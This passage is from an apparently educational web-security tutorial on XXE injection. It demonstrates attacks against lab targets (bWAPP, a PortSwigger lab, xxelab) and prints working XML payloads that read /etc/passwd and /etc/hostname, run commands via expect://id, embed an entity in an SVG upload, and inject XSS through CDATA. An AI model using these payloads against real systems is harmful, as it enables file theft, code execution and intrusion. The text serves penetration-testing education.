<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Comprehensive Guide on XXE Injection</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/" rel="bookmark"><time class="entry-date published" datetime="2020-11-19T13:05:38+00:00">November 19, 2020</time><time class="updated" datetime="2025-06-08T17:59:15+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In the world of application security, one of the lesser-known yet highly critical vulnerabilities is the <strong data-start="261" data-end="285">XXE Injection attack</strong> (XML External Entity Injection). This attack exploits the way XML parsers process external entities, allowing attackers to read sensitive files, perform server-side request forgery (SSRF), or even execute remote code under certain conditions. Whether you’re a penetration tester or a developer, understanding the risks associated with XXE Injection attacks is essential for securing XML-based applications.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong>XML</strong> is a markup language that is commonly used in web development. It is used for storing and transporting data. So, today in this article, we will learn how an attacker can use this vulnerability to gain information and try to defame web-application.</span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;">XXE Testing Methodology</span></h3>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">Introduction to XML</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Introduction to XXE Injection</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Impacts</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">XXE for SSRF</span>
<ul>
<li class="ai-optimize-13"><span style="color: #000000;">Local File</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Remote File</span></li>
</ul>
</li>
<li class="ai-optimize-15"><span style="color: #000000;">XXE Billion Laugh Attack</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">XXE using file upload</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Remote Code Execution</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">XSS via XXE</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">JSON and Content Manipulation</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">Blind XXE</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">Mitigation Steps</span></li>
</ul>
<h3 class="ai-optimize-22"><span style="color: #800000;">Introduction to XML</span></h3>
<h4 class="ai-optimize-23"><span style="color: #000000;">What are XML and Entity?</span></h4>
<p class="ai-optimize-24"><span style="color: #000000;"><em>XML stands for “E<strong>x</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage”,It is the most common language for storing and transporting data.</em> It is a self-descriptive language. It does not contain any predefined tags like &lt;p&gt;, &lt;img&gt;, etc. All the tags are user-defined depending upon the data it is representing for example. &lt;email&gt;&lt;/email&gt;, &lt;message&gt;&lt;/message&gt; etc.</span></p>
<p class="ai-optimize-25"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IFB_6Q-FDnk/X7ZlNExNX7I/AAAAAAAAqy0/_OUivmJyt-wiqbKWQRHo66sW3SBk5F6AgCLcBGAsYHQ/s16000/0.png"/></span></p>
<ul>
<li class="ai-optimize-26"><span style="color: #000000;"><strong>Version:</strong> It is used to specify what version of XML standard is being used.</span>
<ul>
<li class="ai-optimize-27"><span style="color: #000000;"><strong>Values: </strong>1<strong>.</strong>0</span></li>
</ul>
</li>
<li class="ai-optimize-28"><span style="color: #000000;"><strong>Encoding: </strong>It is declared to specify the encoding to be used. The default encoding that is used in XML is <strong>UTF-8.</strong></span>
<ul>
<li class="ai-optimize-29"><span style="color: #000000;"><strong>Values: </strong>UTF-8, UTF-16, ISO-10646-UCS-2, ISO-10646-UCS-4, Shift_JIS, ISO-2022-JP, ISO-8859-1 to ISO-8859-9, EUC-JP</span></li>
</ul>
</li>
<li class="ai-optimize-30"><span style="color: #000000;"><strong>Standalone: </strong>It informs the parser if the document has any link to an external source or there is any reference to an external document. The default value is no.</span>
<ul>
<li class="ai-optimize-31"><span style="color: #000000;"><strong>Values: </strong>yes, no</span></li>
</ul>
</li>
</ul>
<h4 class="ai-optimize-32"><span style="color: #000000;"><strong>What is an Entity?</strong></span></h4>
<p class="ai-optimize-33"><span style="color: #000000;">Like there are variables in programming languages we have XML Entity. They are the way of representing data that are present inside an XML document. There are various built-in entities in XML language like &amp;lt; and &amp;gt; which are used for less than and greater than in XML language. All of these metacharacters generally represent entities that appear in data. XML external entities are the entities that are located outside DTD.</span></p>
<p class="ai-optimize-34"><span style="color: #000000;">An external entity declaration uses the SYSTEM keyword and must specify a URL from which to load the value of the entity. For example</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;!ENTITY ignite SYSTEM "URL"&gt;</pre>
<p class="ai-optimize-35"><span style="color: #000000;">In this syntax <strong>Ignite</strong> is the name of the entity,</span></p>
<p class="ai-optimize-36"><span style="color: #000000;"><strong>SYSTEM </strong>is the keyword used,</span></p>
<p class="ai-optimize-37"><span style="color: #000000;"><strong>URL</strong> is the URL that we want to get by performing an XXE attack.</span></p>
<h4 class="ai-optimize-38"><span style="color: #000000;">What is the Document Type Definition (DTD)?</span></h4>
<p class="ai-optimize-39"><span style="color: #000000;">It is used for declaration of the structure of XML document, types of data value that it can contain, etc. DTD can be present inside the XML file or can be defined separately. It is declared at the beginning of XML using &lt;!DOCTYPE&gt;.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;">There are several types of DTDs and the one we are interested in is external DTDs. </span></p>
<p class="ai-optimize-41"><span style="color: #000000;"><strong>SYSTEM: </strong>The system identifier enables us to specify the external file location that contains the DTD declaration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;!DOCTYPE ignite SYSTEM "URL" [...] &gt;</pre>
<p class="ai-optimize-42"><span style="color: #000000;"><strong>PUBLIC: </strong>Public identifiers create a mechanism to locate DTD resources and write them as below −</span></p>
<p class="ai-optimize-43"><span style="color: #000000;">As you can see, the keyword PUBLIC begins the entry, followed by a specialized identifier. Entries in a catalog use public identifiers for identification.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;!DOCTYPE raj PUBLIC "URL"</pre>
<h3 class="ai-optimize-44"><span style="color: #800000;">Introduction to XXE Injection</span></h3>
<p class="ai-optimize-45"><span style="color: #000000;">An attacker performs an XXE attack against an application to parse its XML input. In this attack, a weakly configured XML parser processes XML input containing a reference to an external entity. Like in Cross-Site Scripting (XSS) we try to inject scripts similarly in this we try to insert XML entities to gain crucial information.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">The declaration of the structure of the XML document, types of data value that it can contain, etc., uses it. You can present DTD inside the XML file or define it separately. It is declared at the beginning of XML using &lt;!DOCTYPE&gt;.</span></p>
<p class="ai-optimize-47"><span style="color: #000000;">There are several types of DTDs and the one we are interested in is external DTDs. There are two types of external DTDs.</span></p>
<p class="ai-optimize-180"><span style="color: #000000;"><strong>SYSTEM: </strong>System identifier enables us to specify the external file location that contains the DTD declaration</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zvx6Sfo3s-A/X7ZlUL60k3I/AAAAAAAAqy4/QSTW-ubiJCcUSwefj_u4UfRrVG_mVnj4wCLcBGAsYHQ/s16000/1.0.png"/></span></p>
<p class="ai-optimize-50"><span style="color: #000000;">In this XML external entity, a payload is sent to the server, which then sends that data to an XML parser that parses the XML request and provides the desired output to the server. Then server returns that output to the attacker.</span></p>
<h3 class="ai-optimize-51"><span style="color: #800000;">Impacts</span></h3>
<p class="ai-optimize-52"><span style="color: #000000;">XML External Entity (XXE) can possess a severe threat to a company or a web developer. XXE has always been in Top 10 list of OWASP. Many websites commonly use XML for the string and transportation of data, and if they do not take countermeasures, attackers will compromise this information. Various attacks that are possible are:</span></p>
<ul>
<li class="ai-optimize-53"><span style="color: #000000;">Server-Side Request Forgery</span></li>
<li class="ai-optimize-54"><span style="color: #000000;">DoS Attack</span></li>
<li class="ai-optimize-55"><span style="color: #000000;">Remote Code Execution</span></li>
<li class="ai-optimize-56"><span style="color: #000000;">Cross-Site Scripting</span></li>
</ul>
<p class="ai-optimize-57"><span style="color: #000000;">The CVSS score of XXE is <strong>7.5</strong> and its severity is <strong>Medium </strong>with –</span></p>
<ul>
<li class="ai-optimize-58"><span style="color: #000000;"><strong>CWE-611: </strong>Improper Restriction of XML External Entity.</span></li>
<li class="ai-optimize-59"><span style="color: #000000;"><strong>CVE-2019-12153:</strong> Local File SSRF</span></li>
<li class="ai-optimize-60"><span style="color: #000000;"><strong>CVE-2019-12154:</strong> Remote File SSRF</span></li>
<li class="ai-optimize-61"><span style="color: #000000;"><strong>CVE-2018-1000838:</strong> Billion Laugh Attack</span></li>
<li class="ai-optimize-62"><span style="color: #000000;"><strong>CVE-2019-0340:</strong> XXE via File Upload</span></li>
</ul>
<h3 class="ai-optimize-63"><span style="color: #800000;">Performing XXE Attack to perform SSRF</span></h3>
<p class="ai-optimize-64"><span style="color: #000000;">Server-Side Request Forgery (SSRF) is a web vulnerability where the hacker injects server-side HTML codes to get control over the site or to redirect the output to the attacker’s server. File types for SSRF attacks are –</span></p>
<h4 class="ai-optimize-65"><span style="color: #000000;">Local File</span></h4>
<p class="ai-optimize-66"><span style="color: #000000;">These are the files that are present on the website domain like robots.txt, server-info, etc. So, let’s use “bWAPP” to perform an XXE attack at a level set to <strong>low</strong>.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t4lQV40hX-U/X7Zla6o7pII/AAAAAAAAqy8/RFLThTN9qGwDF8qrp7jIVOnyKFYl3km9QCLcBGAsYHQ/s16000/1.png"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Now we will fire up our BurpSuite and intercept after pressing Any Bugs? button and we will get the following output on burp:</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uLN9WjRyR2M/X7ZlgOz2XsI/AAAAAAAAqzE/JfeOXwxnM6QyBOnSuGRX1XrCBESbC5hhgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">We can see that there is no filter applied so XXE is possible so we will send it to the repeater and there we will perform our attack.  We will try to know which field is vulnerable or injectable because we can see there are two 0 fields i.e., <strong>login and secret.</strong></span></p>
<p class="ai-optimize-71"><span style="color: #000000;">So, we will test it as follows:</span></p>
<p class="ai-optimize-72"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X_FUE6C_PBY/X7ZlkeI7QTI/AAAAAAAAqzI/uEKfxJX8uTwqHo9789MtJmT0MRevrJhhwCLcBGAsYHQ/s16000/3.png"/></span></p>
<p class="ai-optimize-73"><span style="color: #000000;">In the repeater tab, we will send the default request and observe the output in the response tab.</span></p>
<p class="ai-optimize-74"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b4cIfu8y_zA/X7ZmvcsXO3I/AAAAAAAAqz4/DLQsRuJv5UID91KlLX6tKVJnOIhiHgVpQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p class="ai-optimize-75"><span style="color: #000000;">It says <strong><em>“bee’s secret has been reset” </em></strong>so it seems that login is injectable but let’s verify this by changing it from bee and then sending the request.</span></p>
<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EC3ozBnUfKI/X7Zm0V7vegI/AAAAAAAAqz8/gXL6OO-XYAU9dYBcba4luZS0Mosx7q8qQCLcBGAsYHQ/s16000/5.png"/></span></p>
<p class="ai-optimize-77"><span style="color: #000000;">Now again we will be observing its output in response tab:</span></p>
<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wDraDJJCQPQ/X7Zm7peB8AI/AAAAAAAAq0A/SxRWKt5SV482mU0wIimvXjuwAUGdjsstACLcBGAsYHQ/s16000/6.png"/></span></p>
<p class="ai-optimize-79"><span style="color: #000000;">We got the output <strong><em>“ignite’s secret has been reset”  </em></strong>so it makes it clear that login is injectable. Now we will perform our attack.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;">Now as we know which field is injectable, let’s try to get the robots.txt file. And for this, we’ll be using the following payload –</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE reset [
&lt;!ENTITY ignite SYSTEM "http://192.168.1.15/bWAPP/robots.txt"&gt;
]&gt;
&lt;reset&gt;&lt;login&gt;&amp;ignite;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</pre>
<h5 class="ai-optimize-81"><strong><span style="color: #000000;">Understanding the payload</span></strong></h5>
<p class="ai-optimize-82"><span style="color: #000000;">We have declared a doctype with the name “<strong><em>reset” </em></strong>and then inside that declared an entity named “<strong><em>ignite”</em></strong>. We are using SYSTEM identifier and then entering the URL to robots.txt. Then in login, we are entering “<strong><em>&amp;ignite;” </em></strong>to get the desired information<strong><em>. </em></strong></span></p>
<p class="ai-optimize-83"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rJgRpAyZbTs/X7ZnBBFVcgI/AAAAAAAAq0I/tcQBh1teUEghW0XgPN2Jy04qaGmkB7F0wCLcBGAsYHQ/s16000/7.png"/></span></p>
<p class="ai-optimize-84"><span style="color: #000000;">After inserting the above code, we will click on send and will get output like below in the response tab:</span></p>
<p class="ai-optimize-85"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wR4Y6GARWQ4/X7Znb4fsB0I/AAAAAAAAq0g/4gdrFvXZyW4aqMqcjvy6U8EbeHr3twfLACLcBGAsYHQ/s16000/8.png"/></span></p>
<p class="ai-optimize-86"><span style="color: #000000;">We can see in the above output that we got all the details that are present in the robots.txt. This tells us that SSRF of the local file is possible using XXE.</span></p>
<p class="ai-optimize-87"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-baEigIsJ4ZE/X7ZnUfoSzeI/AAAAAAAAq0Y/RRBtoDDRIvgT6EzAi1v67AvR9q5PUBheQCLcBGAsYHQ/s16000/9.0.png"/></span></p>
<p class="ai-optimize-88"><span style="color: #000000;">So now, let’s try to understand how it all worked. Firstly, we will inject the payload, and the server will receive it. As there are no filters present to avoid XXE, the server sends the request to an XML parser and then sends the output of the parsed XML file. In this case, the attacker disclosed robots.txt using an XML query.</span></p>
<h4 class="ai-optimize-89"><span style="color: #000000;">Remote File</span></h4>
<p class="ai-optimize-90"><span style="color: #000000;">These are the files that attacker injects a remotely hosted malicious scripts in order to gain admin access or crucial information. We will try to get <strong>/etc/passwd</strong> for that we will enter the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE reset [
&lt;!ENTITY ignite SYSTEM "file:///etc/passwd"&gt;
]&gt;&lt;reset&gt;&lt;login&gt;&amp;ignite;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</pre>
<p class="ai-optimize-91"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RkalIRYAhA0/X7ZnjBXWIiI/AAAAAAAAq0k/b2_dwP9J1pgGJ6GbGJVW1zRdwavX699ugCLcBGAsYHQ/s16000/9.png"/></span></p>
<p class="ai-optimize-92"><span style="color: #000000;">After entering the above command as soon as we hit the send button we’ll be reflected with the passwd file !!</span></p>
<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0qCfKVPIoCY/X7Znq0t4aaI/AAAAAAAAq0s/IB_wNIq_KH04X0iLsoyOuxrsNtWNMrc2gCLcBGAsYHQ/s16000/10.png"/></span></p>
<h3 class="ai-optimize-94"><span style="color: #800000;"><strong>XXE Billion Laugh Attack-DOS</strong></span></h3>
<p class="ai-optimize-95"><span style="color: #000000;">These are aimed at XML parsers in which both, well-formed and valid, XML data crashes the system resources when being parsed. This attack is also known as XML bomb or XML DoS or exponential entity expansion attack.</span></p>
<p class="ai-optimize-96"><span style="color: #000000;">Before performing the attack, lets know <strong>why it is known as Billion Laugh Attack?</strong></span></p>
<p class="ai-optimize-97"><span style="color: #000000;"><em>“For the first time when this attack was done, the attacker used lol as the entity data and the called it multiple times in several following entities. It took exponential amount of time to execute and its result was a successful DoS attack bringing the website down. Due to usage of lol and calling it multiple times that resulted in billions of requests we got the name Billion Laugh Attack”</em></span></p>
<p class="ai-optimize-98"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rgGWJLmhSmk/X7Zn2b06pQI/AAAAAAAAq00/GzrhzC8xGIsbT4B8IXVkMYOtPfwB4uBEQCLcBGAsYHQ/s16000/11.0.png"/></span></p>
<p class="ai-optimize-99"><span style="color: #000000;">Before using the payload lets understand it:</span></p>
<p class="ai-optimize-100"><span style="color: #000000;">In this, we see that at <strong>1</strong> we have declared the entity named “<strong><em>ignite” </em></strong>and then calling ignite in several other entities thus forming a chain of callbacks which will overload the server.  At 2, we called entity &amp;ignite9; We chose ignite9 instead of ignite because ignite9 calls ignite8 several times, and each time ignite8 is called, it initiates ignite7, and so on. Thus, the request will take an exponential amount of time to execute and as a result, the website will be down.</span></p>
<p class="ai-optimize-101"><span style="color: #000000;">Above command results in DoS attack and the output that we got is:</span></p>
<p class="ai-optimize-102"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Hlu92_RAx00/X7Zn_HkZNCI/AAAAAAAAq08/u3A85qVheHESJhD5Jo5Er8LYL9EJvJifgCLcBGAsYHQ/s16000/11.png"/></span></p>
<p class="ai-optimize-103"><span style="color: #000000;">Now after entering the XML command we will not see any output in response field and also bee box is not accessible and it will be down.</span></p>
<p class="ai-optimize-104"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NmTgsO0p1dY/X7ZoHIwwPeI/AAAAAAAAq1E/JbHf7qrO3C8W11Vo05Hc_vxn8UKgoLU0QCLcBGAsYHQ/s16000/12.png"/></span></p>
<h3 class="ai-optimize-105"><span style="color: #800000;">XXE Using File Upload</span></h3>
<p class="ai-optimize-106"><span style="color: #000000;">XXE can be performed using the file upload method. We will be demonstrating this using Port Swigger lab <strong>“Exploiting XXE via Image Upload”.</strong> The payload that we will be using is:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?XML version="1.0" standalone="yes"?&gt;
&lt;!DOCTYPE reset [
&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ] &gt;
&lt;svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
&lt;text font-size="40" x="0" y="100"&gt;&amp;xxe;&lt;/text&gt;
&lt;/svg&gt;</pre>
<p class="ai-optimize-107"><span style="color: #000000;"><strong>Understanding the payload:</strong>We will create an SVG file as only the upload area accepts image files. The basic syntax of the SVG file is provided above, and we have added a text field in that.</span></p>
<p class="ai-optimize-108"><span style="color: #000000;">We will be saving the above code as <strong>“payload.svg”.</strong> Now on portswigger, we will go on a post and comment and then we will add the made payload in the avatar field.</span></p>
<p class="ai-optimize-109"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Gc7KmcKvccc/X7ZoMY0pKBI/AAAAAAAAq1I/1CykhDJOveoFKtnoABugZnYa25PL_imPgCLcBGAsYHQ/s16000/13.png"/></span></p>
<p class="ai-optimize-110"><span style="color: #000000;">Now we will be posting the comment by pressing Post Comment button. After this, we will visit the post on which we posted our comment, and we will see our comment in the comments section.</span></p>
<p class="ai-optimize-111"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AniSeuufigQ/X7ZoTmjeZnI/AAAAAAAAq1Q/Y2SfaHc3fPUsGWxk-1tAe3dWD7vhX1mswCLcBGAsYHQ/s16000/14.png"/></span></p>
<p class="ai-optimize-112"><span style="color: #000000;">Let’s check its page source in order to find the comment that we posted. You will find somewhat similar to what I got below</span></p>
<p class="ai-optimize-113"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4ypLV8-P6F4/X7Zoa31_95I/AAAAAAAAq1U/E-5ufOGALnQu5nFKVzexqytITlbhf-qIACLcBGAsYHQ/s16000/15.png"/></span></p>
<p class="ai-optimize-114"><span style="color: #000000;">We will be clicking on the above link and we will get the flag in a new window as follows:</span></p>
<p class="ai-optimize-115"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oFIK8gcRmtI/X7Zofk3_EoI/AAAAAAAAq1c/WTIO3ZbakfEwB61Auo9vK_Md6SyhCwjmwCLcBGAsYHQ/s16000/16.png"/></span></p>
<p class="ai-optimize-116"><span style="color: #000000;">This can be verified by submitting the flag and we will get the success message.</span></p>
<p class="ai-optimize-117"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s6evfpJCk-M/X7ZomzE1_hI/AAAAAAAAq1k/e98RRhoK3_Mrf0MXggzQK__EPtsApfM_wCLcBGAsYHQ/s16000/17.png"/></span></p>
<p class="ai-optimize-118"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cJnaati0ueU/X7Zos4EAaYI/AAAAAAAAq1s/msx-ybVIkv0Eb8YpQgOI_XuCbZvwd9ciACLcBGAsYHQ/s16000/18.png"/></span></p>
<p class="ai-optimize-119"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-axlOa6EX8Pc/X7ZoyQz9bWI/AAAAAAAAq1w/1cM9qQqHgeIPlHl7rMj1R8Vx5H1Zj3iXQCLcBGAsYHQ/s16000/19.png"/></span></p>
<p class="ai-optimize-120"><span style="color: #000000;"><strong>Understanding the whole concept: </strong>So, when we uploaded the payload in the avatar field and filled all other fields too, the system showed our comment in the post. Upon examining the source file, we found the path where we uploaded our file. We are interested in that field as our XXE payload was inside that SVG file and it will be containing the information that we wanted, in this case, we wanted”<strong><em>/etc/domain”. </em></strong>After clicking on that link, we were able to see the information.</span></p>
<h3 class="ai-optimize-121"><span style="color: #800000;">XXE to Remote code Execution</span></h3>
<p class="ai-optimize-122"><span style="color: #000000;">Remote code execution is a very server web application vulnerability. In this an attacker is able to inject its malicious code on the server in order to gain crucial information. To demonstrate this attack I have used<span style="color: #0000ff;"><strong> <u><a style="color: #0000ff;" href="https://github.com/jbarone/xxelab">XXE LAB</a></u></strong></span>. We will follow below steps to download this lab and to run this on our Linux machine:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jbarone/xxelab.git
cd xxelab
vagrant up</pre>
<p class="ai-optimize-123"><span style="color: #000000;">In our terminal we will get somewhat similar output as following:</span></p>
<p class="ai-optimize-124"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CGkfWaYOXzM/X7Zo4_CBmAI/AAAAAAAAq10/9QOSpe4oAQI6j3GenlA4Bpfz3nMe7KI-ACLcBGAsYHQ/s16000/20.png"/></span></p>
<p class="ai-optimize-125"><span style="color: #000000;">Now once it’s ready to be use we will open the browser and type: <u><strong>http://192.168.33.10/</strong></u> and we will see the site looks like this:</span></p>
<p class="ai-optimize-126"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3YjPUvWyPrs/X7Zo-X6E8PI/AAAAAAAAq18/KBvMStSXrY0TraFnEM5vCwfkLE6CsAzDQCLcBGAsYHQ/s16000/21.png"/></span></p>
<p class="ai-optimize-127"><span style="color: #000000;">We will be entering our details and intercepting the request using Burp Suite. In Burp Suite we will see the request as below:</span><br/>
<span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l1NZQV2YV_g/X7ZpDZ6M0WI/AAAAAAAAq2A/uT_uTaYMfo4eFHctaFDRgvIKRnim80mNwCLcBGAsYHQ/s16000/22.png"/></span></p>
<p class="ai-optimize-128"><span style="color: #000000;">We will send this request to repeater and we will see which field is vulnerable. So, firstly we will send the request as it is and observe the  response tab:</span></p>
<p class="ai-optimize-129"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lhMZWbxh-eE/X7ZpIU4Xk1I/AAAAAAAAq2E/cdQ2az3rUEgUTPuvqG48OGYc0MWQZlEVwCLcBGAsYHQ/s16000/23.png"/></span></p>
<p class="ai-optimize-130"><span style="color: #000000;">We can notice that we see only email so we will further check with one more entry to verify that this field is the vulnerable one among all the fields.</span></p>
<p class="ai-optimize-131"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o_WmFjCFjtQ/X7ZpOFcetxI/AAAAAAAAq2I/G4283E7y4IQDIb__--WTmb_vSxFcIRivgCLcBGAsYHQ/s16000/24.png"/></span></p>
<p class="ai-optimize-132"><span style="color: #000000;">From the above screenshot it’s clear that the email field is vulnerable. Now we will enter our payload:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;!DOCTYPE root [
&lt;!ENTITY ignite SYSTEM "expect://id"&gt; ]&gt;</pre>
<p class="ai-optimize-133"><span style="color: #000000;">Let’s understand the payload before implementing it:</span></p>
<p class="ai-optimize-134"><span style="color: #000000;">We have created a doctype with the name ”<strong><em>root</em></strong>” and under that, we created an entity named “<strong><em>ignite</em></strong>” which is asking for “expect://id”. If expect is being accepted in a php page then remote code execution is possible. We are fetching the id so we used “id” in this case.</span></p>
<p class="ai-optimize-135"><span style="color: #000000;">And we can see that we got the uid,gid and group number successfully. This proves that our remote code execution was successful in this case.</span></p>
<p class="ai-optimize-136"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-1y_M-zhU4oc/X7Zpbf7z8pI/AAAAAAAAq2Y/Gwwqs7127ZsWMao5NzfSOl8Io1r64Y5ggCLcBGAsYHQ/s16000/25.png"/></strong><strong> </strong></span></p>
<h3 class="ai-optimize-137"><span style="color: #800000;">XSS via XXE</span></h3>
<p class="ai-optimize-138"><span style="color: #000000;">These days, we can observe that online apps restrict scripts, thus there is a means to go around this. To execute this attack, we can utilize XML’s CDATA. CDATA will be included in our mitigation phase as well. We performed XSS using the XXE LAB mentioned above. We will just inject our payload into the email field because we know it is vulnerable and we have the same intercepted request as in the last attack. The payload that we will employ is as follows:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;![CDATA[&lt;]]&gt;img src="" onerror=javascript:alert(1)&lt;![CDATA[&gt;]]&gt;</pre>
<p class="ai-optimize-139"><span style="color: #000000;"><strong>Understanding the payload: </strong>As we know that in most of the input fields, they block <strong>&lt; and &gt;</strong>, so we included it inside the CDATA. CDATA is character data, and the XML parser does not parse the data inside CDATA; it appears as it is pasted in the output.<strong> </strong></span></p>
<p class="ai-optimize-140"><span style="color: #000000;">Let’s see this attack:</span></p>
<p class="ai-optimize-141"><span style="color: #000000;">We will enter the above command in between the email field and we will observe the output in the response tab.</span></p>
<p class="ai-optimize-142"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZY8WCVmpuo0/X7uca0wunbI/AAAAAAAArDE/isGrKnAz94EDljpRaYcm3gwUUm-i5JEEgCLcBGAsYHQ/s16000/1.png"/></span></p>
<p class="ai-optimize-143"><span style="color: #000000;">Then, we can see that we have got the image tag embedded in the field with our script. We will right-click on it and select the option “<strong>Show response in browser</strong>”</span></p>
<p class="ai-optimize-144"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DJoPIELBBuE/X7uc3Ifaf_I/AAAAAAAArDM/9wgl9nDZXJIEkvW--6d--5Uno1MxCobagCLcBGAsYHQ/s16000/2.png"/></span></p>
<p class="ai-optimize-145"><span style="color: #000000;">We will copy the above link and paste it in the browser and we will be shown an alert box saying “1” as we can observe in the below screenshot.</span></p>
<p class="ai-optimize-146"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HwZaQlgKdiU/X7udBXyZrkI/AAAAAAAArDQ/Z5ctiWofDuslXmMr-2S3NehfFZs8re4XACLcBGAsYHQ/s16000/3.png"/></span></p>
<p class="ai-optimize-147"><span style="color: #000000;">So, the screenshot makes us clear that we were able to do Cross-Site Scripting using XML.</span></p>
<h3 class="ai-optimize-148"><span style="color: #800000;">JSON and Content Manipulation</span></h3>
